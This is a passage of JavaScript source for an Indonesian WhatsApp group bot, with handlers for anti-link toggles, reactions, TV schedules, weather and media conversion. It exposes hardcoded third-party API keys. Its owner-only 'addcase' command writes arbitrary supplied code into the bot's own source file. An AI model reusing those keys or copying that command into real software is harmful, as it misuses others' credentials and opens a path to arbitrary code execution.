Al.sendMessage(m.chat, {text: `*Pertanyaan :* Haruskah ${q}\n*Jawaban :* ${keh}` }, {quoted: fkontak})
}
break
//========================
case 'antiwame': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiWame) return m.reply(`_Kan udah aktif sebelumnya_`)
antiwame.push(m.chat)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
m.reply('Successfully Activated Antiwame')
} else if (args[0] === "off") {
if (!isAntiWame) return m.reply(`_It's already inactive_`)
let anu = antiwame.indexOf(m.chat)
antiwame.splice(anu, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame, null, 2))
m.reply('Successfully Deactivation Antilinkwame')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break
//========================
case 'antilinkytvid': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLinkYoutubeVid) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinkytvid.push(m.chat)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvid, null, 2))
m.reply('Successfully Activated Antilinkytvid')
} else if (args[0] === "off") {
if (!isAntiLinkYoutubeVid) return m.reply(`_It's already inactive_`)
let anu = antilinkytvid.indexOf(m.chat)
antilinkytvid.splice(anu, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvid, null, 2))
m.reply('Successfully Deactivation Antilinkytvid')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break
//========================
case 'antilinktt': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLinkTiktok) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinktt.push(m.chat)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktt, null, 2))
m.reply('Successfully Activated Antilinktt')
} else if (args[0] === "off") {
if (!isAntiLinkTiktok) return m.reply(`_It's already inactive_`)
let anu = antilinktt.indexOf(m.chat)
antilinktt.splice(anu, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktt, null, 2))
m.reply('Successfully Deactivation Antilinktt')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
  }
}
break
//========================
case 'furina-ai': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (args[0] === "on") {
if (isResponx) return m.reply(`Furina udah aktif sebelumnya`)
responx.push(m.chat)
fs.writeFileSync('./database/responx.json', JSON.stringify(responx, null, 2))
m.reply('Successfully Activated furina ai')
} else if (args[0] === "off") {
if (!isResponx) return m.reply(`Furina udah nonaktif sebelumnya`)
let anu = responx.indexOf(m.chat)
responx.splice(anu, 1)
fs.writeFileSync('./database/responx.json', JSON.stringify(responx, null, 2))
m.reply('Successfully Deactivation furina ai')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: wm
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://telegra.ph/file/72b973058c1985de0eda8.jpg' } }, { upload: Al.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: wm,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix} furina-ai on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix} furina-ai off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363232588171807@newsletter',
            newsletterName: '⛅ ʜɪ ʙʀᴏᴏ ||「 𝐌𝐚𝐧𝐮-𝐌𝐃  」 𝒃𝒚 𝐌𝐚𝐧𝐮𝐥 💗',
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await Al.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
}, { quoted: floc});
}
}
break
//========================
case 'listban': 
case 'listbanned': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator) return m.reply('Special For Owner Features!')
let txt = `*LIST DIBANNED*\n*Total :* *${banned.length}* Di-banned\n\n`
for (let blk of banned) {
txt += `*•* @${blk.split('@')[0]}\n`
}
Al.sendTextWithMentions(m.chat, txt, m)
}
break
//========================
case 'apasih': case 'bilek': case 'jir': case 'bjir': case 'wkwk': case 'apaan': case 'kocak': case 'haha': case 'xixi': case 'bejir': case 'njir': case 'anjir': case 'loh': case 'halah': case 'heleh': case 'hilih': case 'huluh': case 'yahaha': case 'ngeri': case 'sayang': case 'syg': case 'syng': case 'amat': case 'dih': case 'hadeh': case 'haduh': case 'aduh': case 'waduh': case 'wadoh': case 'love': {
let reak = ['🗿', '😁', '🤓', '😴', '😯', '😆', '😂', '🤣', '😋', '😊', '😏', '😇', '🤫', '😪', '🤩', '😱', '😨', '🧐', '😜', '🤪', '😄', '😎', '🤑', '🤥', '🤠', '😬', '🤔', '🤕', '😈', '👿', '😅', '🤤', '🤖', '🌚', '🌝', '💀', '🙈', '🙉', '🙊', '😸', '🗣️', '👤', '👥', '😲']
let reakk = reak[Math.floor(Math.random() * reak.length)]
Al.sendMessage(m.chat, { react: {text: reakk, key: m.key}})
}
break
//========================
case 'addcase': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply('Mana case nya bang?');
const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'AiBotzz.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return;
}

// Cari posisi awal dari kumpulan case 'gimage'
const posisiAwalGimage = data.indexOf("case 'addcase':");

if (posisiAwalGimage !== -1) {
// Tambahkan case baru tepat di atas case 'gimage'
const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

// Tulis kembali file dengan case baru
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
if (err) {
m.reply('Terjadi kesalahan saat menulis file:', err);
} else {
m.reply('Case baru berhasil ditambahkan di atas case gimage.');
}
});
} else {
m.reply('Tidak dapat menemukan case gimage dalam file.');
}
});

}
break;

  
  // Case-case lainnya
//========================
case 'antilinkytch': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLinkYoutubeChannel) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinkytch.push(m.chat)
fs.writeFileSync('./database/antilinkytch.json', JSON.stringify(antilinkytch, null, 2))
m.reply('Successfully Activated Antilinkytch')
} else if (args[0] === "off") {
if (!isAntiLinkYoutubeChannel) return m.reply(`_It's already inactive_`)
let anu = antilinkytch.indexOf(m.chat)
antilinkytch.splice(anu, 1)
fs.writeFileSync('./database/antilinkytch.json', JSON.stringify(antilinkytch, null, 2))
m.reply('Successfully Deactivation Antilinkytch')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antilall': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLAll) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinkall.push(m.chat)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall, null, 2))
m.reply('Successfully Activated Antilinkall')
} else if (args[0] === "off") {
if (!isAntiLAll) return m.reply(`_It's already inactive_`)
let anu = antilinkall.indexOf(m.chat)
antilinkall.splice(anu, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall, null, 2))
m.reply('Successfully Deactivation Antilinkall')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'listowner': 
case 'listown':
if (!isRegistered) return terdaftar()
if (!isCreator) return m.reply('Special For Owner Features!')
teks = '*LIST OWNER*\n\n'
for (let kontol of owner) {
teks += `- ${kontol}\n`
}
teks += `\n*Total : ${owner.length}* Owner`
Al.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
//========================
case 'jadwaltv':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (args.length == 0) return m.reply(`*Contoh :* ${prefix + command} RCTI`)
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/${args[0]}?apikey=3ded02033757fbd61ff60876`)
var txtayaj = `Jadwal TV ${args[0].toUpperCase()}\n`
for (var x in data.result) {
txtayaj += `${x} - ${data.result[x]}\n`
}
m.reply(txtayaj)
break
//=================================================
case 'jadwaltvnow':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=3ded02033757fbd61ff60876`)
var txtayajas = `Jadwal TV Now :\n\n`
for (var x in data.result) {
txtayajas += `${x.toUpperCase()}${data.result[x]}\n\n`
}
m.reply(txtayajas)
break
//========================
case 'ceritahoror':
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=3ded02033757fbd61ff60876`)
Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
var caption = `Title : ${data.result.title}\n`
caption += `Desc : ${data.result.desc}\n`
caption += `Story :\n${data.result.story}\n`
await Al.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
break
//========================
case 'google': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text) return m.reply(`*Contoh :* ${prefix + command} fatih arridho`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `• *Title* : ${g.title}\n`
teks += `• *Description* : ${g.snippet}\n`
teks += `• *Link* : ${g.link}\n\n─────────────┈──\n\n`
} 
m.reply(teks)
})
}
break
//========================
case 'getname2': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Special For Owner Features!')
await m.reply('_Mengambil namanya..._')
if (qtod === "true") {
const namenye = await Al.getName(m.quoted.sender)
Al.sendMessage(m.chat, {text: `${namenye}`}, {quoted:fkontak})
} else if (qtod === "false") {
Al.sendMessage(from, {text:"Reply pesan orangnya yang mau kamu ambil nickname nya!"}, {quoted:m})
}
}
break
//========================
case 'infogempa':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var { data } = await axios.get(`https://api.lolhuman.xyz/api/infogempa?apikey=3ded02033757fbd61ff60876`)
var caption = `*Lokasi :* ${data.result.lokasi}\n`
caption += `*Waktu :* ${data.result.waktu}\n`
caption += `*Potensi :* ${data.result.potensi}\n`
caption += `*Magnitude :* ${data.result.magnitude}\n`
caption += `*Kedalaman :* ${data.result.kedalaman}\n`
caption += `*Koordinat :* ${data.result.koordinat}`
Al.sendMessage(from, { image: { url: data.result.map }, caption })
break
//========================
case 'demoteall':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isOwnerGroup) return m.reply('Special For Owner Features Group!')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!isAdmins) return m.reply('Lu kira lu Admin grup?')
await loading()
var groupe = await Al.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Al.groupParticipantsUpdate(from, mems, 'demote')
break
//=================================================//
case 'promoteall':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isOwnerGroup) return m.reply('Special For Owner Features Group!')
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isBotAdmins) return m.reply('Saya bukan Admin grup!')
if (!isAdmins) return m.reply('Lu kira lu Admin grup?')
await loading()
var groupe = await Al.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Al.groupParticipantsUpdate(from, mems, 'promote')
break
//========================
case 'toaudio1': 
case 'tomp31': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
if (!/video/.test(mime) && !/audio/.test(mime)) return `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) return `Send/Reply the Video/Audio You Want to Use as Audio With Caption _${prefix + command}_`
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let media = await Al.downloadMediaMessage(quoted)
let { toAudio } = require('./lib/converter1')
let audio = await toAudio(media, 'mp4')
Al.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
//=================================================//
case 'tovn1': 
case 'voice': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
if (!/video/.test(mime) && !/audio/.test(mime)) return `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) return `Reply Video/Audio That You Want To Be VN With Caption _${prefix + command}_`
let media = await quoted.download()
let { toPTT } = require('./lib/converter1')
let audio = await toPTT(media, 'mp4')
Al.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/94742274855',
title: `© AiBotzz-MD`,
sourceUrl: `https://wa.me/628389654057716`, 
thumbnail: global.mark
}
}})
}
break
//=================================================//
case 'togif1': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
if (!quoted) return 'Reply Imagenya'
if (!/webp/.test(mime)) return `Reply sticker with caption ${prefix + command}`
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
let { webp2mp4File } = require('./lib/uploader1')
let media = await Al.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Al.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, {quoted:m})
await fs.unlinkSync(media)
}
break
//========================
case 'antilxxnx': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLxxnx) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinkxxnx.push(m.chat)
fs.writeFileSync('./database/antilinkxxnx.json', JSON.stringify(antilinkxxnx, null, 2))
m.reply('Successfully Activated Antilinkxxnx')
} else if (args[0] === "off") {
if (!isAntiLxxnx) return m.reply(`_It's already inactive_`)
let anu = antilinkxxnx.indexOf(m.chat)
antilinkxxnx.splice(anu, 1)
fs.writeFileSync('./database/antilinkxxnx.json', JSON.stringify(antilinkxxnx, null, 2))
m.reply('Successfully Deactivation Antilinkxxnx')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antilinktele': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLTele) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinktele.push(m.chat)
fs.writeFileSync('./database/antilinktele.json', JSON.stringify(antilinktele, null, 2))
m.reply('Successfully Activated Antilinktele')
} else if (args[0] === "off") {
if (!isAntiLTele) return m.reply(`_It's already inactive_`)
let anu = antilinktele.indexOf(m.chat)
antilinktele.splice(anu, 1)
fs.writeFileSync('./database/antilinktele.json', JSON.stringify(antilinktele, null, 2))
m.reply('Successfully Deactivation Antilinktele')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antilinkig': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLIg) return m.reply(`_Kan udah aktif sebelumnya_`)
antilinkig.push(m.chat)
fs.writeFileSync('./database/antilinkig.json', JSON.stringify(antilinkig, null, 2))
m.reply('Successfully Activated Antilinkig')
} else if (args[0] === "off") {
if (!isAntiLIg) return m.reply(`_It's already inactive_`)
let anu = antilinkig.indexOf(m.chat)
antilinkig.splice(anu, 1)
fs.writeFileSync('./database/antilinkig.json', JSON.stringify(antilinkig, null, 2))
m.reply('Successfully Deactivation Antilinkig')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'toonce':
case 'toviewonce': 
case 'torvo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!quoted) return m.reply(`Kirim Image/Balas Vidio Dengan Caption ${prefix + command}`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}}) 
if (/image/.test(mime)) {
let anuan = await Al.downloadAndSaveMediaMessage(quoted)
Al.sendMessage(m.chat, {
image: {
url: anuan
},
caption: `_DONE_`,
fileLength: "999",
viewOnce: true
}, {
quoted: m
})
} else if (/video/.test(mime)) {
let anuanuan = await Al.downloadAndSaveMediaMessage(quoted)
Al.sendMessage(m.chat, {
video: {
url: anuanuan
},
caption: `_DONE_`,
fileLength: "99999999999999",
viewOnce: true
}, {
quoted: m
})
}
}
break
//========================
case 'antilinkfb': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiLFb) return m.reply(`_Kan udh aktif sebelumnya_`)
antilinkfb.push(m.chat)
fs.writeFileSync('./database/antilinkfb.json', JSON.stringify(antilinkfb, null, 2))
m.reply('Successfully Activated Antilinkfb')
} else if (args[0] === "off") {
if (!isAntiLFb) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antilinkfb.indexOf(m.chat)
antilinkfb.splice(anu, 1)
fs.writeFileSync('./database/antilinkfb.json', JSON.stringify(antilinkfb, null, 2))
m.reply('Successfully Deactivation Antilinkfb')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'autoswview':
case 'autostatusview':{
if (!isCreator) return m.reply('Special For Owner Features!')
if (isBan) return terbanned()
if (args.length < 1) return m.reply('on/off?')
if (args[0] === 'on') {
autoswview = true
m.reply(`Autoswview berhasil diaktifkan`)
} else if (args[0] === 'off') {
autoswview = false
m.reply(`Autoswview berhasil dinonaktifkan`)
}
}
break
//========================
case 'qc': 
case 'qcstiker': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix + command} white Hallo Jay\n\n*LIST WARNA YANG ADA*\n\n• Pink\n• Blue\n• Red\n• Green\n• Yellow\n• Purple\n• Darkblue\n• Lightblue\n• Ash\n• Orange\n• black\n• White\n• Teal\n• Lightpink\n• Chocolate\n• Salmon\n• Magenta\n• Tan\n• Wheat\n• Deeppink\n• Fire\n• Skyblue\n• Safron\n• Brightskyblue\n• Hotpink\n• Lightskyblue\n• Seagreen\n• Darkred\n• Orangered\n• Cyan\n• Violet\n• Mossgreen\n• Darkgreen\n• Navyblue\n• Darkorange\n• Darkpurple\n• Fuchsia\n• Darkmagenta\n• Darkgray\n• Peachpuff\n• Plackishgreen\n• Darkishred\n• Goldenrod\n• Darkishgray\n• Darkishpurple\n• Gold\n• Silver`)
if (text.length > 100) return m.reply(`Max 100 character.`)
await Al.sendMessage(m.chat, { react: { text: "💗",key: m.key,}})   
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return m.reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await Al.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let responsee = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(responsee.data.result.image, 'base64');
Al.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `AiBotzz-MD`})
}
break
//========================
case 'antiaudio': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiAudio) return m.reply(`_Kan udh aktif sebelumnya_`)
antiaudio.push(m.chat)
fs.writeFileSync('./database/antiaudio.json', JSON.stringify(antiaudio, null, 2))
m.reply('Successfully Activated AntiAudio')
} else if (args[0] === "off") {
if (!isAntiAudio) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antiaudio.indexOf(m.chat)
antiaudio.splice(anu, 1)
fs.writeFileSync('./database/antiaudio.json', JSON.stringify(antiaudio, null, 2))
m.reply('Successfully Deactivation AntiAudio')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antivideo': case 'antividio': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiVideo) return m.reply(`_Kan udh aktif sebelumnya_`)
antivideo.push(m.chat)
fs.writeFileSync('./database/antivideo.json', JSON.stringify(antivideo, null, 2))
m.reply('Successfully Activated AntiVideo')
} else if (args[0] === "off") {
if (!isAntiVideo) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antivideo.indexOf(m.chat)
antivideo.splice(anu, 1)
fs.writeFileSync('./database/antivideo.json', JSON.stringify(antivideo, null, 2))
m.reply('Successfully Deactivation AntilVideo')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'antisticker': 
case 'antistiker': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus Admin!')
if (!isBotAdmins) return m.reply("Saya bukan Admin grup!")
if (args[0] === "on") {
if (isAntiSticker) return m.reply(`_Kan udh aktif sebelumnya_`)
antisticker.push(m.chat)
fs.writeFileSync('./database/antisticker.json', JSON.stringify(antisticker, null, 2))
m.reply('Successfully Activated AntiSticker')
} else if (args[0] === "off") {
if (!isAntiSticker) return m.reply(`_Kan udh nonaktif sebelumnya_`)
let anu = antisticker.indexOf(m.chat)
antisticker.splice(anu, 1)
fs.writeFileSync('./database/antisticker.json', JSON.stringify(antisticker, null, 2))
m.reply('Successfully Deactivation AntiSticker')
} else {
m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
}
}
break
//========================
case 'infocuaca': 
case 'cuaca': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!q) return m.reply(`*Contoh :* ${prefix + command} Jakarta`)
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=id`
            );
            let textw = ""
            textw += `*🗺️ Weather of ${text} 🗺️*\n\n`
